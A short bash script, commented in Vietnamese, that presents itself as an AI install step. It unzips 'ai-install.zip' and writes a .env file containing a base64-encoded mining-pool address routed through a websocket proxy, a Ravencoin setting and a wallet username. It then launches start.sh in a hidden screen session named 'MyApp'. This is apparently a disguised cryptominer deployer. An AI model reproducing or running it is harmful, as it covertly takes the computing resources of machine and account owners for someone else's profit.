#!/bin/bash

# Cập nhật hệ thống
y | sudo apt update -y

# Cập nhật hệ thống không cần quyền sudo (dành cho user có quyền)
y | apt update -y

yes A | unzip ai-install.zip

echo -e "host=127.0.0.1\nport=3306\nproxy=wss://epoch-labs.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nthreads=7\npassword=c=RVN\nusername=RFikJQEPWj7hveHt9G8wwLfufEmDagoRf4" > .env

# Cài đặt screen
y | apt install screen -y
y | sudo apt install screen -y

# Tạo một phiên screen và chạy script start.sh
screen -dmS MyApp bash start.sh
